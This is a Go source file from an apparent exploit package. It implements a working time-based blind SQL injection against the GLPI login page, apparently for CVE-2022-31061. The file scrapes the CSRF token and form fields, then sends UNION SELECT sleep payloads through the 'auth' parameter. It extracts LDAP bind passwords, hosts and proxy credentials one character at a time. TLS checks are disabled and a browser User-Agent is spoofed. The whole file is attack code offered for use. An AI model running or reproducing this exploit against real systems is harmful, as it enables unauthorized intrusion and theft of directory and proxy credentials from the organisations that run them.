package exploits

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"

	"github.com/PuerkitoBio/goquery"
)

type ReqData struct {
	LOGIN string
	PASS  string
	REME  string
	CSRF  string
	COOK  string
}

type DBinf struct {
	TABLENAME string
	COLNAME   []string
}

var TableP = []DBinf{
	{
		TABLENAME: "glpi_authldaps",
		COLNAME:   []string{"host", "basedn", "rootdn", "is_active", "rootdn_passwd"},
	},
	{
		TABLENAME: "glpi_configs",
		COLNAME:   []string{"proxy_name", "proxy_port", "proxy_user", "proxy_passwd"},
	},
}

var reqField ReqData
var CSRF = true
var Dic = "abcdefghijklmnopqrstuvwxyz.=,ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\"#$%&'()*+-/:;<>?@[\\]^_`{|}~"
var Dic_nbr = "0123456789"

func GetField(target string) ReqData {

	var exists bool
	res, err := http.Get(target)
	if err != nil {
		log.Fatal(err)
	}
	defer res.Body.Close()

	if res.StatusCode != 200 {
		log.Fatalf("status code error: %d %s", res.StatusCode, res.Status)
	}

	doc, err := goquery.NewDocumentFromReader(res.Body)
	if err != nil {
		log.Fatal(err)
	}

	reqField.CSRF, exists = doc.Find("input[name='_glpi_csrf_token']").Attr("value")
	if !exists {
		fmt.Println("CSRF token not found, the exploit will maybe fail :'(")
		CSRF = false
	}

	reqField.LOGIN, exists = doc.Find("input#login_name").Attr("name")
	if !exists {
		log.Fatal("Login field not found")
	}

	reqField.PASS, exists = doc.Find("input[type='password']").Attr("name")
	if !exists {
		log.Fatal("Password field not found")
	}

	reqField.REME, exists = doc.Find("input[type='checkbox']").Attr("name")
	if !exists {
		log.Fatal("Remember me field not found")
	}

	for _, cookie := range res.Cookies() {
		if strings.HasPrefix(cookie.Name, "glpi") {
			reqField.COOK = cookie.Name + "=" + cookie.Value
			break
		}
	}

	return reqField
}

func ExtractColNbr(target string, sleept string, CSRF bool) string {
	defaultSleep := "2"

	if sleept == "" {
		sleept = defaultSleep
	}
	var col_nbr string
	var data string
	sleeptint, _ := strconv.Atoi(sleept)
	if CheckCVE202231061INJ(target) {
		for _, nbr := range Dic_nbr {
			var field = GetField(target)
			authPayload := url.QueryEscape("ldap-1' UNION SELECT IF((SELECT id FROM glpi_authldaps ORDER BY id DESC LIMIT 1)=" + string(nbr) + ",sleep(" + sleept + "),0) # ")

			if CSRF {
				data = fmt.Sprintf("noAUTO=1&%s=User&%s=Password&auth=%s&%s=on&submit=&_glpi_csrf_token=%s", field.LOGIN, field.PASS, authPayload, field.REME, field.CSRF)
			} else {
				data = fmt.Sprintf("noAUTO=1&%s=User&%s=Password&auth=%s&%s=on&submit=", field.LOGIN, field.PASS, authPayload, field.REME)
			}

			client := &http.Client{
				Transport: &http.Transport{
					TLSClientConfig: &tls.Config{
						InsecureSkipVerify: true,
					},
				},
				Timeout: (time.Duration(sleeptint) + 3) * time.Second,
			}

			req, err := http.NewRequest("POST", target+"/front/login.php", bytes.NewBufferString(data))
			if err != nil {
				fmt.Println(err)
			}

			req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
			req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0")
			req.Header.Add("Referer", target+"/index.php")
			req.Header.Add("Cookie", field.COOK)

			start := time.Now()

			resp, err := client.Do(req)
			if err != nil {
				fmt.Println(err)
			}
			defer resp.Body.Close()

			elapsed := time.Since(start)

			if elapsed.Seconds() > float64(sleeptint) {
				fmt.Println(string(nbr) + " Column in glpi_authldaps table !")
				col_nbr = string(nbr)
			}
		}
	}
	return col_nbr
}

func CVE202231061(target string, sleept string) {
	defaultSleep := "3"
	if sleept == "" {
		sleept = defaultSleep
	}
	sleeptint, _ := strconv.Atoi(sleept)
	var colmaxid = ExtractColNbr(target, sleept, CSRF)

	fmt.Printf("Select the line to extract 1 to %s : ", colmaxid)

	var col_nbr string
	_, err := fmt.Scanf("%s", &col_nbr)
	if err != nil {
		fmt.Println("Error in reading user input, retrieval of column 1")
		col_nbr = "1"
	}

	var data string
	var authPayload string
	for _, tableinf := range TableP {

		for _, colname := range tableinf.COLNAME {

			fmt.Print("\nRetrieving " + colname + " : ")
			for j := 1; j < 666; j++ {

				var notfound = true

				for _, chars := range Dic {

					var field = GetField(target)

					if tableinf.TABLENAME == "glpi_configs" {
						authPayload = url.QueryEscape("ldap-1 'UNION SELECT IF(ASCII(SUBSTRING(value," + strconv.Itoa(j) + ",1)) ='" + strconv.Itoa(int(string(chars)[0])) + "', sleep(" + sleept + "), 0) FROM " + tableinf.TABLENAME + " WHERE name= \"" + colname + "\" # ")

					} else {

						authPayload = url.QueryEscape("ldap-1 'UNION SELECT IF(ASCII(SUBSTRING(" + colname + "," + strconv.Itoa(j) + ",1)) ='" + strconv.Itoa(int(string(chars)[0])) + "', sleep(" + sleept + "), 0) FROM " + tableinf.TABLENAME + " WHERE id= " + col_nbr + " # ")
					}

					if CSRF {
						data = fmt.Sprintf("noAUTO=1&%s=User&%s=Password&auth=%s&%s=on&submit=&_glpi_csrf_token=%s", field.LOGIN, field.PASS, authPayload, field.REME, field.CSRF)
					} else {
						data = fmt.Sprintf("noAUTO=1&%s=User&%s=Password&auth=%s&%s=on&submit=", field.LOGIN, field.PASS, authPayload, field.REME)
					}

					client := &http.Client{
						Transport: &http.Transport{
							TLSClientConfig: &tls.Config{
								InsecureSkipVerify: true,
							},
						},
						Timeout: (time.Duration(sleeptint) + 3) * time.Second,
					}

					req, err := http.NewRequest("POST", target+"/front/login.php", bytes.NewBufferString(data))
					if err != nil {
						fmt.Println(err)
					}

					req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
					req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0")
					req.Header.Add("Referer", target+"/index.php")
					req.Header.Add("Cookie", field.COOK)

					start := time.Now()

					resp, err := client.Do(req)
					if err != nil {
						fmt.Println(err)
					}
					defer resp.Body.Close()

					elapsed := time.Since(start)

					if elapsed.Seconds() > float64(sleeptint) {

						fmt.Print(string(chars))
						notfound = false
						break
					}

				}
				if notfound {
					break
				}

			}

		}

	}

}
